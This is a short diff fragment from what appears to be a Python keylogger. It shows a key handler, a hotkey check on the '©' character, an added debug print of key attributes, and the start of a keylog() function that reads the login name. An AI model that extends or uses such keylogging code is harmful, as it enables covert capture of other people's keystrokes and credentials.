@@ -12,12 +12,12 @@ def key_handler(key):
     parse(key)
 
 def parse(key):
+    print(key.__dict__)
     if not hasattr(key, 'char'):
         return
     if key.char != "©":
         return
     listen()
-
 
 def keylog():
     username = os.getlogin()
